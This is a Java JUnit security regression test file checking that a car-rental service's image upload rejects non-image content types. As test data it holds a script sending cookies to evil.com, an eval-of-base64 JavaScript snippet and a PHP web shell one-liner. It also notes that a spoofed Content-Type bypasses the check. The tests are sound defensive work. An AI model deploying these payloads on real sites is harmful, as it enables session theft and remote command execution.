package com.extendrent.security;

import org.junit.jupiter.api.DisplayName;
import org.junit.jupiter.api.Test;
import org.mockito.Mockito;
import org.springframework.mock.web.MockMultipartFile;
import src.service.external.CloudinaryServiceImpl;
import src.service.image.ImageRules;
import src.service.image.car.CarImageServiceImpl;
import src.repository.image.CarImageRepository;

import static org.assertj.core.api.Assertions.assertThatThrownBy;

/**
 * Security regression tests for V07 — File-type validation on image upload.
 *
 * OWASP A03 – Injection | CWE-434 – Unrestricted Upload of File with Dangerous Type
 *
 * Security patch V07: CarImageServiceImpl now validates the declared Content-Type
 * against a whitelist (image/jpeg, image/png, image/webp).  Files with a
 * Content-Type outside that list are rejected with FileException(INVALID_FILE_TYPE)
 * before any upload to Cloudinary takes place.
 *
 * Note: this approach trusts the declared Content-Type header rather than reading
 * file bytes (no Apache Tika / magic-bytes check).  A client supplying a spoofed
 * Content-Type would still bypass this layer; however Cloudinary performs its own
 * server-side validation as a second line of defence.
 */
@DisplayName("V07 – File-type validation on upload (OWASP A03 / CWE-434)")
class FileUploadSecurityTest {

    private final CarImageRepository repository = Mockito.mock(CarImageRepository.class);
    private final ImageRules rules = Mockito.mock(ImageRules.class);
    private final CloudinaryServiceImpl cloudinary = Mockito.mock(CloudinaryServiceImpl.class);

    private final CarImageServiceImpl service = new CarImageServiceImpl(repository, rules, cloudinary);

    @Test
    @DisplayName("File with Content-Type text/html is rejected (not in image whitelist)")
    void htmlContentType_mustBeRejected() throws Exception {
        byte[] htmlPayload = "<html><script>document.location='https://evil.com?c='+document.cookie</script></html>"
                .getBytes();

        MockMultipartFile maliciousFile = new MockMultipartFile(
                "image",
                "photo.html",
                "text/html",
                htmlPayload
        );

        assertThatThrownBy(() -> service.create(maliciousFile, "ABC123"))
                .as("File with Content-Type text/html must be rejected by the content-type whitelist")
                .isInstanceOf(src.core.exception.FileException.class);
    }

    @Test
    @DisplayName("File with Content-Type application/javascript is rejected (not in image whitelist)")
    void jsContentType_mustBeRejected() throws Exception {
        byte[] jsPayload = "eval(atob('YWxlcnQoJ3hzcycpOw=='));".getBytes();

        MockMultipartFile maliciousFile = new MockMultipartFile(
                "image",
                "script.js",
                "application/javascript",
                jsPayload
        );

        assertThatThrownBy(() -> service.create(maliciousFile, "XYZ789"))
                .as("File with Content-Type application/javascript must be rejected")
                .isInstanceOf(src.core.exception.FileException.class);
    }

    @Test
    @DisplayName("File with Content-Type application/octet-stream is rejected (not in image whitelist)")
    void octetStreamContentType_mustBeRejected() throws Exception {
        byte[] phpPayload = "<?php system($_GET['cmd']); ?>".getBytes();

        MockMultipartFile maliciousFile = new MockMultipartFile(
                "image",
                "payload.bin",
                "application/octet-stream",
                phpPayload
        );

        assertThatThrownBy(() -> service.create(maliciousFile, "DEF456"))
                .as("File with Content-Type application/octet-stream must be rejected")
                .isInstanceOf(src.core.exception.FileException.class);
    }

    @Test
    @DisplayName("PASSES: empty file is rejected (existing null check)")
    void emptyFile_isRejectedByExistingCheck() throws Exception {
        MockMultipartFile emptyFile = new MockMultipartFile(
                "image", "empty.jpg", "image/jpeg", new byte[0]
        );

        // This already works via the PHOTO_IS_EMPTY check
        assertThatThrownBy(() -> service.create(emptyFile, "GHI789"))
                .isInstanceOf(src.core.exception.FileException.class);
    }
}
